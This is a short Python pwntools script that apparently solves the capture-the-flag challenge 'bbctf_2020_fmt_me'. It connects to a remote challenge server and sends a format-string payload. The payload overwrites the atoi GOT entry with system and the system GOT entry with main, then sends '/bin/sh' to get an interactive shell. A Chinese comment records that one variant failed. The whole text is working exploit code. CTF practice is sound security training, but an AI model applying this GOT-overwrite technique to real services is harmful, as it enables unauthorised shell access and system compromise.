from pwn import *

context(log_level='debug',arch='amd64')

#io=process("./bbctf_2020_fmt_me")

io=remote("node3.buuoj.cn",28583)

elf=ELF("./bbctf_2020_fmt_me")

io.recv()

io.sendline(b'2')

io.recv()

atoi_got=elf.got['atoi']

system_plt=elf.plt['system']

system_got=elf.got['system']

main=0x4011f7

offset=6
#atoi_got:system_plt打不通
payload=fmtstr_payload(offset,{atoi_got:system_plt+6,system_got:main})

io.sendline(payload)

io.recv()

io.sendline(b'/bin/sh')

io.interactive()